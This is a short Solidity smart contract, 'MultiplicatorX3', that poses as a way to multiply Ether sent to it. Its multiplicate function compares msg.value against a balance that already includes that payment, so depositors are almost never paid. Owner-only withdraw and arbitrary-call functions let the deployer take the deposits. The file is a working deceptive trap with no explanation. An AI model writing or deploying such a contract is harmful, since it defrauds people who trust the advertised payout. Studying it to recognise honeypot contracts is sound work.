pragma solidity ^0.4.18;

contract MultiplicatorX3
{
    address public O = msg.sender;
    address addr;

    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        addr = msg.sender;
        require(addr == O);
        O.transfer(this.balance);
    }
    
    function Command(address a,bytes d)
    payable
    public
    {
        addr = msg.sender;
        require(addr == O);
         
        a.call.value(msg.value)(d);
    }
    
    function multiplicate(address a)
    public
    payable
    {
        addr = a;
        if(msg.value>=this.balance)
        {        
            addr.transfer(this.balance+msg.value);
        }
    }
}